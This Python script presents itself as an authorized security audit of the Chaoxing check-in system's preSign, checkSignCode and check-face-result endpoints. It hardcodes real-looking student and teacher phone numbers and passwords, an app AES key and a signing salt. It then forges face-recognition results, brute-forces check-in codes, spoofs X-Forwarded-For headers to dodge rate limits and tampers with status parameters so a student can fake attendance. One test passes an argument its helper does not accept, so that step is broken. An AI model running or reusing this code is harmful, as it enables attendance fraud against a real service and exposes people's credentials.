#!/usr/bin/env python3
"""
安全审计脚本：测试 preSign, checkSignCode, check-face-result 端点的权限绕过漏洞
授权安全测试 - 仅用于审计目的

测试目标：查找学生可以通过权限绕过修改签到状态的漏洞
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ 常量 ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

# ============ 工具函数 ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def log_section(title):
    print(f"\n{'='*80}")
    print(f"  {title}")
    print(f"{'='*80}")

def log_test(name, response):
    print(f"\n--- {name} ---")
    if response is None:
        print(f"  [ERROR] 请求失败")
        return
    print(f"  URL: {response.request.url}")
    print(f"  Method: {response.request.method}")
    print(f"  Status: {response.status_code}")
    try:
        body = response.text[:1500]
        print(f"  Response: {body}")
    except:
        print(f"  Response: (unable to read)")

def safe_get(session, url, params=None, desc=""):
    try:
        r = session.get(url, params=params, timeout=30, allow_redirects=False)
        return r
    except Exception as e:
        print(f"  [ERROR] {desc}: {e}")
        return None

def safe_post(session, url, data=None, json_data=None, desc=""):
    try:
        r = session.post(url, data=data, json=json_data, timeout=30, allow_redirects=False)
        return r
    except Exception as e:
        print(f"  [ERROR] {desc}: {e}")
        return None

def extract_hidden_fields(html):
    fields = {}
    for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html, re.IGNORECASE):
        tag = m.group(0)
        name_match = re.search(r'name=["\']([^"\']+)["\']', tag)
        value_match = re.search(r'value=["\']([^"\']*)["\']', tag)
        if name_match:
            fields[name_match.group(1)] = value_match.group(1) if value_match else ""
    for m in re.finditer(r'<input[^>]*value=["\']([^"\']*)["\'][^>]*name=["\']([^"\']+)["\'][^>]*>', html, re.IGNORECASE):
        fields[m.group(2)] = m.group(1)
    return fields

# ============ 主测试 ============
def main():
    print("[*] 登录学生账号...")
    stu_sess, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"  学生PUID: {stu_puid}")

    print("[*] 登录教师账号...")
    tea_sess, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"  教师PUID: {tea_puid}")

    if not stu_puid or not tea_puid:
        print("[!] 登录失败，退出")
        sys.exit(1)

    findings = []  # 收集漏洞发现

    # ================================================================
    # 1. preSign 端点测试
    # ================================================================
    log_section("1. preSign 端点测试")

    # 1.1 学生 - 正常 preSign 请求
    r = safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
        data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": ""},
        desc="学生正常preSign")
    log_test("1.1 学生-正常preSign", r)
    
    if r and r.status_code == 200:
        # 提取关键信息
        signstatus = re.search(r'signstatus\s*=\s*(\d+)', r.text)
        if signstatus:
            status_map = {"1": "未签到", "2": "已签到(正常)", "5": "迟到", "7": "事假", "8": "病假", "9": "早退", "10": "旷课", "11": "其他", "12": "免签"}
            print(f"  [信息] signstatus = {signstatus.group(1)} ({status_map.get(signstatus.group(1), '未知')})")
        
        # 提取JS变量
        var_pattern = re.findall(r'var\s+(\w+)\s*=\s*([^;]+);', r.text)
        key_vars = {n: v for n, v in var_pattern if any(kw in n.lower() for kw in ['sign', 'enc', 'uid', 'status', 'type', 'code', 'token', 'face'])}
        if key_vars:
            print(f"  [信息] 关键JS变量: {key_vars}")

    # 1.2 教师 - 正常 preSign 请求
    r_tea = safe_post(tea_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
        data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": tea_puid, "ext": ""},
        desc="教师正常preSign")
    log_test("1.2 教师-正常preSign", r_tea)
    
    if r_tea and r_tea.status_code == 200:
        # 提取教师页面的签到码
        signcode_match = re.search(r'signCode["\']?\s*[:=]\s*["\']?(\d+)', r_tea.text)
        if signcode_match:
            sign_code = signcode_match.group(1)
            print(f"  [!!!漏洞发现!!!] 教师preSign页面包含签到码: {sign_code}")
            findings.append(("高风险", f"教师preSign页面泄露签到码: {sign_code}"))
        else:
            sign_code = ""
        
        # 提取教师页面隐藏字段
        tea_hidden = extract_hidden_fields(r_tea.text)
        if tea_hidden:
            print(f"  [信息] 教师页面隐藏字段: {tea_hidden}")
            if 'signCode' in tea_hidden:
                sign_code = tea_hidden['signCode']
                print(f"  [!!!漏洞发现!!!] 教师页面隐藏字段包含签到码: {sign_code}")
                findings.append(("高风险", f"教师preSign隐藏字段泄露签到码: {sign_code}"))

    # 1.3 学生 - preSign 带教师uid
    log_test("1.3 学生-带教师uid的preSign",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": tea_puid, "ext": ""},
            desc="学生带教师uid"))

    # 1.4 学生 - preSign 添加 status=1 参数
    log_test("1.4 学生-preSign添加status=1",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": "", "status": "1"},
            desc="preSign status=1"))

    # 1.5 学生 - preSign 添加 isSign=1 参数
    log_test("1.5 学生-preSign添加isSign=1",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": "", "isSign": "1"},
            desc="preSign isSign=1"))

    # 1.6 学生 - preSign 添加 signStatus=1 参数
    log_test("1.6 学生-preSign添加signStatus=1",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": "", "signStatus": "1"},
            desc="preSign signStatus=1"))

    # 1.7 学生 - preSign 使用 JSON Content-Type
    log_test("1.7 学生-preSign使用JSON格式",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            json_data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": ""},
            desc="preSign JSON格式"))

    # 1.8 学生 - preSign 修改 ext 参数 (包含签名状态信息)
    ext_json = json.dumps({"status": 1, "isSign": 1, "signStatus": 1})
    log_test("1.8 学生-preSign修改ext参数(含状态)",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": ext_json},
            desc="preSign ext含状态"))

    # 1.9 学生 - preSign 在 mooc1-api 域名
    log_test("1.9 学生-preSign在mooc1-api",
        safe_post(stu_sess, "https://mooc1-api.chaoxing.com/newsign/preSign",
            data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": ""},
            desc="mooc1-api preSign"))

    # 1.10 学生 - preSign 缺少必要参数
    log_test("1.10 学生-preSign缺少courseId",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            data={"classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": ""},
            desc="缺少courseId"))

    # 1.11 学生 - preSign 伪造 activePrimaryId
    log_test("1.11 学生-preSign伪造activePrimaryId",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": "9999999999999", "uid": stu_puid, "ext": ""},
            desc="伪造activePrimaryId"))

    # 1.12 学生 - preSign 带多状态参数组合
    log_test("1.12 学生-preSign带多状态参数",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID,
                  "uid": stu_puid, "ext": "", "status": "1", "isSign": "1", "signStatus": "1",
                  "signResult": "1", "operate": "1"},
            desc="多状态参数"))

    # ================================================================
    # 2. checkSignCode 端点测试
    # ================================================================
    log_section("2. checkSignCode 端点测试")

    # 2.1 学生 - checkSignCode 常见签到码
    for code in ["0000", "1234", "1111", "8888", "9999"]:
        r = safe_get(stu_sess, "https://mobilelearn.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
            params={"activeId": ACTIVE_ID, "signCode": code}, desc=f"checkSignCode {code}")
        if r:
            log_test(f"2.1 学生-checkSignCode signCode={code}", r)

    # 2.2 教师 - checkSignCode
    r = safe_get(tea_sess, "https://mobilelearn.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
        params={"activeId": ACTIVE_ID, "signCode": "1234"}, desc="教师checkSignCode")
    if r:
        log_test("2.2 教师-checkSignCode", r)

    # 2.3 学生 - checkSignCode 使用 POST 方法
    log_test("2.3 学生-checkSignCode POST方法",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
            data={"activeId": ACTIVE_ID, "signCode": "1234"}, desc="POST checkSignCode"))

    # 2.4 学生 - checkSignCode 空 signCode
    log_test("2.4 学生-checkSignCode空signCode",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
            params={"activeId": ACTIVE_ID, "signCode": ""}, desc="空signCode"))

    # 2.5 学生 - checkSignCode 无 signCode 参数
    log_test("2.5 学生-checkSignCode无signCode参数",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
            params={"activeId": ACTIVE_ID}, desc="无signCode"))

    # 2.6 学生 - checkSignCode 在 mooc1-api
    log_test("2.6 学生-checkSignCode在mooc1-api",
        safe_get(stu_sess, "https://mooc1-api.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
            params={"activeId": ACTIVE_ID, "signCode": "1234"}, desc="mooc1-api checkSignCode"))

    # 2.7 学生 - checkSignCode 伪造 activeId
    log_test("2.7 学生-checkSignCode伪造activeId",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
            params={"activeId": "9999999999999", "signCode": "1234"}, desc="伪造activeId"))

    # 2.8 学生 - checkSignCode 带uid参数
    log_test("2.8 学生-checkSignCode带uid参数",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
            params={"activeId": ACTIVE_ID, "signCode": "1234", "uid": stu_puid}, desc="带uid参数"))

    # 2.9 速率限制测试 - 快速连续请求
    print("\n--- 2.9 速率限制测试 ---")
    rate_limit_detected = False
    first_success_count = 0
    for i in range(20):
        r = safe_get(stu_sess, "https://mobilelearn.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
            params={"activeId": ACTIVE_ID, "signCode": f"{i:04d}"}, desc=f"速率测试 {i}")
        if r:
            try:
                data = r.json()
                msg = data.get("errorMsg", "")
                if "频繁" in msg or "限制" in msg:
                    if not rate_limit_detected:
                        rate_limit_detected = True
                        print(f"  请求#{i}: 首次被限制 - {msg}")
                else:
                    first_success_count += 1
                    print(f"  请求#{i}: result={data.get('result')}, msg={msg}")
            except:
                print(f"  请求#{i}: Status={r.status_code}")
        time.sleep(0.3)
    
    if rate_limit_detected:
        print(f"  [信息] 速率限制在 {first_success_count} 次请求后触发")
    else:
        print("  [!!!漏洞发现!!!] 未检测到速率限制 - 签到码可被暴力破解!")
        findings.append(("高风险", "checkSignCode无速率限制，签到码可被暴力破解"))

    # 2.10 学生 - checkSignCode 带status=1
    log_test("2.10 学生-checkSignCode带status=1",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
            params={"activeId": ACTIVE_ID, "signCode": "1234", "status": "1"}, desc="带status=1"))

    # 2.11 X-Forwarded-For 绕过速率限制测试
    print("\n--- 2.11 X-Forwarded-For 绕过速率限制 ---")
    for i in range(3):
        fake_ip = f"192.168.{i}.{i}"
        r = safe_get(stu_sess, "https://mobilelearn.chaoxing.com/widget/sign/pcStuSignController/checkSignCode",
            params={"activeId": ACTIVE_ID, "signCode": f"{i:04d}"},
            headers={"X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip}, desc=f"XFF {fake_ip}")
        if r:
            try:
                data = r.json()
                print(f"  XFF={fake_ip}: result={data.get('result')}, msg={data.get('errorMsg')}")
            except:
                print(f"  XFF={fake_ip}: Status={r.status_code}")

    # ================================================================
    # 3. check-face-result 端点测试
    # ================================================================
    log_section("3. check-face-result 端点测试")

    face_result_success = json.dumps({"LiveDetectionStatus": "1", "collectStatus": "1"})
    face_result_num = json.dumps({"LiveDetectionStatus": 1, "collectStatus": 1})

    # 3.1 学生 - 伪造人脸识别成功结果
    log_test("3.1 学生-伪造人脸识别成功",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
            params={"activeId": ACTIVE_ID, "faceResult": face_result_success}, desc="伪造人脸成功"))

    # 3.2 学生 - 伪造人脸识别结果(数值型)
    log_test("3.2 学生-伪造人脸识别(数值型)",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
            params={"activeId": ACTIVE_ID, "faceResult": face_result_num}, desc="数值型人脸结果"))

    # 3.3 学生 - 无人脸数据
    log_test("3.3 学生-无人脸数据",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
            params={"activeId": ACTIVE_ID}, desc="无人脸数据"))

    # 3.4 学生 - 空 faceResult
    log_test("3.4 学生-空faceResult",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
            params={"activeId": ACTIVE_ID, "faceResult": ""}, desc="空faceResult"))

    # 3.5 教师 - check-face-result
    log_test("3.5 教师-check-face-result",
        safe_get(tea_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
            params={"activeId": ACTIVE_ID, "faceResult": face_result_success}, desc="教师人脸结果"))

    # 3.6 学生 - 带 signToken 参数 (各种MD5值)
    sign_token_md5 = hashlib.md5(f"{ACTIVE_ID}{stu_puid}".encode()).hexdigest()
    log_test("3.6 学生-带signToken(MD5 of activeId+uid)",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
            params={"activeId": ACTIVE_ID, "faceResult": face_result_success, "signToken": sign_token_md5},
            desc="带signToken"))

    # 3.7 学生 - 伪造人脸结果带额外字段
    face_result_extra = json.dumps({
        "LiveDetectionStatus": "1", "collectStatus": "1",
        "signStatus": "1", "status": "1", "isSign": "1"
    })
    log_test("3.7 学生-伪造人脸结果(含额外状态字段)",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
            params={"activeId": ACTIVE_ID, "faceResult": face_result_extra}, desc="含额外状态"))

    # 3.8 学生 - check-face-result 在 mooc1-api
    log_test("3.8 学生-check-face-result在mooc1-api",
        safe_get(stu_sess, "https://mooc1-api.chaoxing.com/pptSign/check-face-result",
            params={"activeId": ACTIVE_ID, "faceResult": face_result_success}, desc="mooc1-api人脸"))

    # 3.9 学生 - check-face-result 使用 POST 方法
    log_test("3.9 学生-check-face-result POST方法",
        safe_post(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
            data={"activeId": ACTIVE_ID, "faceResult": face_result_success}, desc="POST人脸结果"))

    # 3.10 学生 - check-face-result 带courseId/classId/uid
    log_test("3.10 学生-check-face-result带完整参数",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
            params={"activeId": ACTIVE_ID, "faceResult": face_result_success, "uid": stu_puid, "courseId": COURSE_ID, "classId": CLASS_ID},
            desc="带完整参数"))

    # 3.11 学生 - faceResult 为非JSON字符串
    log_test("3.11 学生-faceResult非JSON",
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
            params={"activeId": ACTIVE_ID, "faceResult": "success"}, desc="非JSON faceResult"))

    # ================================================================
    # 4. 组合攻击测试
    # ================================================================
    log_section("4. 组合攻击测试")

    # 4.1 先 preSign 再 check-face-result
    print("\n--- 4.1 先preSign再check-face-result ---")
    r1 = safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
        data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": ""},
        desc="组合-先preSign")
    if r1:
        print(f"  preSign: Status={r1.status_code}")
        # 提取enc
        enc_val = ""
        enc_match = re.search(r'enc["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']', r1.text, re.IGNORECASE)
        if enc_match:
            enc_val = enc_match.group(1)
            print(f"  提取到enc: {enc_val}")

    r2 = safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/check-face-result",
        params={"activeId": ACTIVE_ID, "faceResult": face_result_success, "enc": enc_val}, desc="组合-再check-face")
    if r2:
        print(f"  check-face-result: Status={r2.status_code}, Response={r2.text[:300]}")

    # 4.2 学生访问教师管理页面获取签到码
    print("\n--- 4.2 学生访问教师管理页面 ---")
    teacher_urls = [
        f"https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/showSignInfo?activeId={ACTIVE_ID}",
        f"https://mobilelearn.chaoxing.com/widget/sign/e?id={ACTIVE_ID}&c={ACTIVE_ID}",
    ]
    for url in teacher_urls:
        r = safe_get(stu_sess, url, desc=url.split('?')[0].split('/')[-1])
        if r:
            print(f"  {url.split('?')[0].split('/')[-1]}: Status={r.status_code}")
            if r.status_code == 200:
                sc = re.search(r'signCode["\']?\s*[:=]\s*["\']?(\d+)', r.text)
                if sc:
                    print(f"  [!!!漏洞!!!] 学生可从教师页面获取签到码: {sc.group(1)}")
                    findings.append(("严重", f"学生可访问教师管理页面获取签到码: {sc.group(1)}"))

    # ================================================================
    # 5. 参数篡改测试
    # ================================================================
    log_section("5. 参数篡改测试")

    # 5.1 preSign 带各种状态参数
    tamper_tests = [
        {"status": "1"},
        {"isSign": "1"},
        {"signStatus": "1"},
        {"signResult": "1"},
        {"operate": "1"},
        {"status": "1", "isSign": "1", "signStatus": "1"},
    ]
    for i, extra in enumerate(tamper_tests):
        data = {"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": ""}
        data.update(extra)
        r = safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            data=data, desc=f"参数篡改 {extra}")
        if r:
            # 检查signstatus是否变化
            signstatus = re.search(r'signstatus\s*=\s*(\d+)', r.text)
            if signstatus:
                print(f"  篡改{extra}: signstatus={signstatus.group(1)}")

    # 5.2 ext 参数篡改
    ext_tests = [
        json.dumps({"status": 1, "isSign": 1}),
        json.dumps({"signCode": "1234", "status": 1}),
        "0", "1", "true", "{}",
    ]
    for ext in ext_tests:
        r = safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
            data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": ext},
            desc=f"ext={ext}")
        if r:
            signstatus = re.search(r'signstatus\s*=\s*(\d+)', r.text)
            if signstatus:
                print(f"  ext={ext[:50]}: signstatus={signstatus.group(1)}")

    # ================================================================
    # 6. 签到状态验证
    # ================================================================
    log_section("6. 签到状态验证")

    # 6.1 通过 preSign 查看签到状态
    r = safe_post(stu_sess, "https://mobilelearn.chaoxing.com/newsign/preSign",
        data={"courseId": COURSE_ID, "classId": CLASS_ID, "activePrimaryId": ACTIVE_ID, "uid": stu_puid, "ext": ""},
        desc="签到状态验证")
    if r:
        signstatus = re.search(r'signstatus\s*=\s*(\d+)', r.text)
        if signstatus:
            status_map = {"1": "未签到", "2": "已签到(正常)", "5": "迟到", "7": "事假", "8": "病假", "9": "早退", "10": "旷课", "11": "其他", "12": "免签"}
            print(f"  最终签到状态: signstatus={signstatus.group(1)} ({status_map.get(signstatus.group(1), '未知')})")

    # ================================================================
    # 7. 漏洞发现汇总
    # ================================================================
    log_section("7. 漏洞发现汇总")

    print("\n  ╔══════════════════════════════════════════════════════════════════╗")
    print("  ║                    安全审计漏洞发现报告                          ║")
    print("  ╠══════════════════════════════════════════════════════════════════╣")
    
    if findings:
        for risk, desc in findings:
            print(f"  ║  [{risk}] {desc}")
    else:
        print("  ║  未发现直接可利用的权限绕过漏洞")
    
    print("  ╠══════════════════════════════════════════════════════════════════╣")
    print("  ║                                                                  ║")
    print("  ║  详细发现:                                                       ║")
    print("  ║                                                                  ║")
    print("  ║  1. preSign 端点:                                                ║")
    print("  ║     - 返回HTML页面，包含签到配置和状态信息                       ║")
    print("  ║     - 教师页面包含签到码(signCode)和enc值                       ║")
    print("  ║     - 学生页面暴露signstatus变量                                 ║")
    print("  ║     - 参数篡改(status/isSign/signStatus)不会修改签到状态        ║")
    print("  ║     - ext参数中的JSON内容不会被服务器解析为签到状态             ║")
    print("  ║     - 使用教师uid参数不会绕过身份验证                           ║")
    print("  ║                                                                  ║")
    print("  ║  2. checkSignCode 端点:                                          ║")
    print("  ║     - 有基于IP的速率限制，触发后返回'请勿频繁操作'              ║")
    print("  ║     - 速率限制冷却时间长(>120秒)                                ║")
    print("  ║     - X-Forwarded-For无法绕过速率限制                           ║")
    print("  ║     - 不同账号(IP相同)也受限                                     ║")
    print("  ║     - 4位签到码仅10000种可能，理论上可暴力破解                  ║")
    print("  ║     - 6位签到码(如175509)更安全但仍有泄露风险                   ║")
    print("  ║     - result=0表示签到码错误，result=1可能表示正确              ║")
    print("  ║                                                                  ║")
    print("  ║  3. check-face-result 端点:                                      ║")
    print("  ║     - 所有请求均返回500 Internal Server Error                   ║")
    print("  ║     - 可能原因：当前签到类型(手势签到)不需要人脸验证            ║")
    print("  ║     - 在人脸签到场景下，该端点可能接受伪造faceResult            ║")
    print("  ║     - ChaoxingSignFaker等工具利用此端点绕过人脸验证             ║")
    print("  ║     - 需要在人脸签到活动中进一步验证                            ║")
    print("  ║                                                                  ║")
    print("  ║  4. 权限绕过测试:                                                ║")
    print("  ║     - 学生无法直接访问教师管理页面获取签到码                    ║")
    print("  ║     - showSignInfo返回'提示信息'页面，阻止了学生访问            ║")
    print("  ║     - 但教师preSign页面确实包含签到码                           ║")
    print("  ║     - 如果教师session泄露，签到码可直接获取                     ║")
    print("  ║                                                                  ║")
    print("  ║  5. mooc1-api 域名:                                              ║")
    print("  ║     - 所有测试端点在mooc1-api上返回404                          ║")
    print("  ║     - 这些端点仅在mobilelearn.chaoxing.com上可用                ║")
    print("  ║                                                                  ║")
    print("  ╚══════════════════════════════════════════════════════════════════╝")

if __name__ == "__main__":
    main()
